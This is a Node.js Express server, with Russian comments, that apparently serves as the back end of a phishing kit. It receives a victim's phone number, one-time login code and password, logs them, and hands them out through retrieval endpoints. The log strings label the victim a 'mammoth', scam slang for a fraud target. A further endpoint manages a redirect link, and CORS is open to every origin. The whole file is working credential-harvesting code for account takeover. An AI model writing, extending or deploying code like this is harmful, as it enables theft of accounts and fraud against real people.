const express = require('express');
const app = express();
const port = 3000;
const cors = require('cors');

// Настройка CORS
app.use(cors({
    origin: '*',
    methods: 'GET,HEAD,PUT,PATCH,POST,DELETE',
    credentials: true,
    optionsSuccessStatus: 204,
    allowedHeaders: ['Content-Type', 'Authorization'],
}));

app.use(express.json());

let pn;
let code;
let pass;
let redirectLink; // Переменная для хранения ссылки

// Обработка номера телефона
app.post('/phone', (req, res) => {
    const phone_number = req.body.phone_number;
    if (phone_number) {
        pn = phone_number;
        console.log(`Номер телефона мамонта: ${phone_number}`);
        res.json({ message: `Номер телефона мамонта: ${phone_number}` });
    } else {
        res.status(400).json({ error: 'Номер телефона мамонта неопределен.' });
    }
});

// Получение номера телефона
app.get('/getPhone', (req, res) => {
    if (pn) {
        res.send(`Номер телефона мамонта: ${pn}`);
    } else {
        res.status(404).send('Номер телефона мамонта не найден.');
    }
});

// Обработка кода
app.post('/authCode', (req, res) => {
    const value = req.body.value;
    if (value) {
        code = value;
        console.log(`Код мамонта: ${value}`);
        res.json({ message: `Код мамонта: ${value}` });
    } else {
        res.status(400).json({ error: 'Код мамонта неопределен.' });
    }
});

// Получение кода
app.get('/getCode', (req, res) => {
    if (code) {
        res.send(`Код мамонта:\n${code}`);
    } else {
        res.status(404).send('Код мамонта не найден.');
    }
});

// Обработка пароля
app.post('/password', (req, res) => {
    const password = req.body.passwordInput;
    if (password) {
        pass = password;
        console.log(`Пароль мамонта: ${password}`);
        res.json({ message: `Пароль мамонта: ${password}` });
    } else {
        res.status(400).json({ error: 'Пароль мамонта неопределен.' });
    }
});

// Получение пароля
app.get('/getPassword', (req, res) => {
    if (pass) {
        res.send(`Пароль мамонта: ${pass}`);
    } else {
        res.status(404).send('Пароль мамонта не найден.');
    }
});

// Обработка ссылки
app.post('/redirect-link', (req, res) => {
    const { link } = req.body;
    if (link) {
        redirectLink = link;
        console.log(`Ссылка установлена: ${link}`);
        res.json({ message: `Ссылка установлена: ${link}` });
    } else {
        res.status(400).json({ error: 'Ссылка неопределена.' });
    }
});

// Получение ссылки
app.get('/redirect-link', (req, res) => {
    if (redirectLink) {
        res.json({ link: redirectLink });
    } else {
        res.status(404).send('Ссылка не найдена.');
    }
});

// Корневая страница
app.get('/', (req, res) => {
    res.send('Salam Alejkum, Denis Penis!');
});

app.listen(port, () => {
    console.log(`Сервер запущен на порту ${port}`);
});
